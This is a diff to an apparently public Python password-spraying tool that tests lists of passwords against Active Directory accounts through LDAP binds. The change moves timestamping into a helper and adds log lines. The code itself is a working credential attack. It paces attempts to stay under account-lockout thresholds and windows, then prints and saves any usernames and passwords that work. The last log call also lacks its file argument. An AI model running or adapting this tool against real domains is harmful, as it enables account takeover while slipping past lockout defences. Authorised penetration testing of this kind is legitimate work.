@@ -58,38 +58,42 @@ def writeFile(msg, file):
 def authAttempt(server, domain, user, passwd):
     s = Server(server, get_info=ALL)
     c = Connection(s, user=f'{domain}\{user}', password=passwd)
-    t = localtime()
     # Check if there was a successful bind
     if not c.bind():
         if c.result["description"] == "invalidCredentials":
             if args.verbose:
-                print(f'[{asctime(t)}]-' + Fore.RED + f"[-] Bad credentials for user {domain}\{user}:{passwd}")
+                print(f'[{getTimestamp()}]-' + Fore.RED + f"[-] Bad credentials for user {domain}\{user}:{passwd}")
         else:  # Something silly happened
-            print(f'[{asctime(t)}]-' + Fore.RED + f'[-] Error in bind: {c.result["description"]}')
+            print(f'[{getTimestamp()}]-' + Fore.RED + f'[-] Error in bind: {c.result["description"]}')
         return False
     else:  # Was a successful connection
         a = c.extend.standard.who_am_i()
         if a:
-            print(f'[{asctime(t)}]-' + Fore.GREEN + f'[+] Authenticated as {a}:{c.extend.microsoft._connection.password}')
+            print(f'[{getTimestamp()}]-' + Fore.GREEN + f'[+] Authenticated as {a}:{c.extend.microsoft._connection.password}')
             return True
 
+def getTimestamp():
+    t = localtime()
+    return asctime(t)
 
 # Gracefully handle CTRL-C within the program, allow users to change mind
 def signal_handler(signal, frame):
     global successDict
     print('')
-    ans = input(f'[{asctime(t)}]-' + Fore.RED + f'[!] CTRL-C detected, do you want to quit? (Y/N) > ' + Fore.RESET)
+    ans = input(f'[{getTimestamp()}]-' + Fore.RED + f'[!] CTRL-C detected, do you want to quit? (Y/N) > ' + Fore.RESET)
     if ans.lower() == 'y':
         if len(successDict) == 0:
-            print(f'[{asctime(t)}]-' + Fore.RED + f'[!] No Creds found, quitting!' + Fore.RESET)
+            print(f'[{getTimestamp()}]-' + Fore.RED + f'[!] No Creds found, quitting!' + Fore.RESET)
             sys.exit(0)
-        print(f'[{asctime(t)}]-' + Fore.GREEN + f'[+] Gathered creds below...' + Fore.RESET)
+        print(f'[{getTimestamp()}]-' + Fore.GREEN + f'[+] Gathered creds below...' + Fore.RESET)
         for username, password in successDict.items():
-            print(f'[{asctime(t)}]-' + Fore.GREEN + f'[+] {username}:{password}')
-        print(f'[{asctime(t)}]-' + Fore.RED + f'[!] Quitting!' + Fore.RESET)
+            print(f'[{getTimestamp()}]-' + Fore.GREEN + f'[+] {username}:{password}')
+        print(f'[{getTimestamp()}]-' + Fore.RED + f'[!] Quitting!' + Fore.RESET)
+        if args.output:
+            writeFile(f'[{getTimestamp()}]- Recieved CTRL-C to quit', args.output)
         sys.exit(0)
     else:
-        print(f'[{asctime(t)}]-' + Fore.CYAN + f'[+] Continuing...' + Fore.RESET)
+        print(f'[{getTimestamp()}]-' + Fore.CYAN + f'[+] Continuing...' + Fore.RESET)
 
 
 # Catch CTRL+C and send it to our signal_handler function
@@ -105,12 +109,10 @@ print('\n' + Fore.WHITE + Back.RED + f'***YOU ARE RESPONSIBLE FOR YOUR OWN ACTIO
 print('')
 
 totalAttacks = len(users) * len(passwords)
-t = localtime()
-print(f'[{asctime(t)}]-' + Fore.RED + f'[!] THIS WILL ATTEMPT {totalAttacks} TOTAL ATTACKS, ARE YOU SURE?')
-print(f'[{asctime(t)}]-' + Fore.RED + f'[!] Enter the total number of attacks to proceed.')
+print(f'[{getTimestamp()}]-' + Fore.RED + f'[!] THIS WILL ATTEMPT {totalAttacks} TOTAL ATTACKS, ARE YOU SURE?')
+print(f'[{getTimestamp()}]-' + Fore.RED + f'[!] Enter the total number of attacks to proceed.')
 
-t = localtime()
-ans = input(f'[{asctime(t)}]-' + Fore.CYAN + f'({totalAttacks}) > ' + Fore.RESET)
+ans = input(f'[{getTimestamp()}]-' + Fore.CYAN + f'({totalAttacks}) > ' + Fore.RESET)
 
 try:
     ans = int(ans)
@@ -127,14 +129,13 @@ successDict = {}
 logging.debug(f'Lockout number is {args.Lockout} and type {type(args.Lockout)}')
 
 if args.output:
-    t = localtime()
-    writeFile(f"[{asctime(t)}]- Started attack using Users file {args.Users} and password file {args.Passwords}.", args.output)
-    writeFile(f"[{asctime(t)}]- Attacking {args.Domain} and server {args.Server} with {args.Lockout} attempts every {args.Window} minutes.", args.output)
+    writeFile("\n=================== Starting new Attack =======================", args.output)
+    writeFile(f"[{getTimestamp()}]- Started attack using Users file {args.Users} and password file {args.Passwords}.", args.output)
+    writeFile(f"[{getTimestamp()}]- Attacking {args.Domain} and server {args.Server} with {args.Lockout} attempts every {args.Window} minutes.", args.output)
 
 for pwd in passwords:
     logging.debug(f'Attempting login with attempt count {atmptCount}')
-    t = localtime()
-    print(f'[{asctime(t)}]-' + Fore.BLUE + f'[*] Attempting password {pwd}')
+    print(f'[{getTimestamp()}]-' + Fore.BLUE + f'[*] Attempting password {pwd}')
     for user in users:
         if user in successfulUsers:
             continue
@@ -143,17 +144,16 @@ for pwd in passwords:
             successDict[user] = pwd
             successfulUsers.append(user)
             if args.output:
-                writeFile(f"[{asctime(t)}]- Successful auth for {user}:{pwd}", args.output)
+                writeFile(f"[{getTimestamp()}]- Successful auth for {user}:{pwd}", args.output)
     atmptCount += 1
     if atmptCount >= args.Lockout:
-        print(f'[{asctime(t)}]-' + Fore.YELLOW + f'[*] Hit attempt count of {args.Lockout}, sleeping for {args.Window} minutes')
+        print(f'[{getTimestamp()}]-' + Fore.YELLOW + f'[*] Hit attempt count of {args.Lockout}, sleeping for {args.Window} minutes')
         logging.debug(f'Detected attempt count is exceeded, sleeping for {args.Window * 60} seconds')
         sleep(args.Window * 60)
         atmptCount = 0
 
-t = localtime()
-print(f'[{asctime(t)}]-' + Fore.CYAN + f'[*] Completed {len(users) * len(passwords)} total attempts')
+print(f'[{getTimestamp()}]-' + Fore.CYAN + f'[*] Completed {len(users) * len(passwords)} total attempts')
 if args.output:
-    writeFile(f"[{asctime(t)}]- Completed attack")
+    writeFile(f"[{getTimestamp()}]- Completed attack")
 
         
